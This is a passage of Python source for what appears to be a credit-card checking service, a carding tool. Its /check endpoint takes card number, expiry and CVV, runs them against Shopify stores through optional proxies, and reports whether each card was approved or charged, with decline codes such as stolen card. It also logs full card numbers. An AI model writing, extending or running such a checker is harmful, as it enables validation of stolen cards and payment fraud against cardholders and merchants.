        'INVALID_CVV': 'INVALID_CVV',
        'CVV_FAILURE': 'INVALID_CVV',
        'INCORRECT_CVC': 'INVALID_CVV',
        'AVS_FAILURE': 'AVS_FAILURE',
        'STOLEN_CARD': 'STOLEN_CARD',
        'LOST_CARD': 'LOST_CARD',
        'EXPIRED_CARD': 'EXPIRED_CARD',
        'CARD_EXPIRED': 'EXPIRED_CARD',
        'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
        'FRAUD_SUSPECTED': 'FRAUD_SUSPECTED',
        'PICKUP_CARD': 'PICKUP_CARD',
        'VELOCITY_LIMIT': 'VELOCITY_LIMIT',
        'EXCEEDS_LIMIT': 'EXCEEDS_LIMIT',
        'RESTRICTED_CARD': 'RESTRICTED_CARD',
        'ORDER_CREATED': 'ORDER_CREATED',
        '3DS_REQUIRED': '3DS_REQUIRED',
    }
    display_code = RESPONSE_DISPLAY_MAP.get(code, code) if code else result.get("response", "UNKNOWN")
    
    return {
        "valid": True,
        "site": site,
        "product": product_name,
        "price": product_price,
        "card_response": display_code,
        "gate": gw,
        "approved": approved,
        "charged": charged,
        "time": f"{elapsed:.1f}s",
    }

@app.post("/check")
async def check(req: CheckRequest):
    if len(req.yy) == 4:
        req.yy = req.yy[2:]
    req.mm = req.mm.zfill(2)
    
    check_start = time.monotonic()
    logger.info(f"[check] {req.cc} proxy={bool(req.proxy)} - start")
    
    try:
        result = await asyncio.wait_for(
            check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, sites=req.sites, proxy=req.proxy),
            timeout=40
        )
    except asyncio.TimeoutError:
        elapsed = time.monotonic() - check_start
        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (40s hard timeout)")
        return {
            "status": "error",
            "response": "UNTESTED",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": req.site or None,
            "elapsed": round(elapsed, 2),
            "verdict": "UNTESTED",
            "code": "",
            "iso": "",
            "meaning": "Hard 40s timeout. Store or proxy too slow. Bank never responded.",
        }
    except asyncio.CancelledError:
        elapsed = time.monotonic() - check_start
        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (cancelled)")
        return {
            "status": "error",
            "response": "UNTESTED",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": req.site or None,
            "elapsed": round(elapsed, 2),
            "verdict": "UNTESTED",
            "code": "CANCELLED",
            "iso": "",
            "meaning": "Request cancelled. Bank never responded.",
        }
    except Exception as e:
        elapsed = time.monotonic() - check_start
        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (error: {str(e)[:80]})")
        return {
            "status": "error",
            "response": "UNTESTED",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": req.site or None,
            "elapsed": round(elapsed, 2),
            "verdict": "UNTESTED",
            "code": "INTERNAL_ERROR",
            "iso": "",
            "meaning": f"Error: {str(e)[:80]}. Bank never responded.",
        }
    
    elapsed = time.monotonic() - check_start
    logger.info(f"[check] {req.cc} verdict={result.get('verdict', '?')} elapsed={elapsed:.1f}s")
    return result

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8081))
    uvicorn.run(app, host="0.0.0.0", port=port)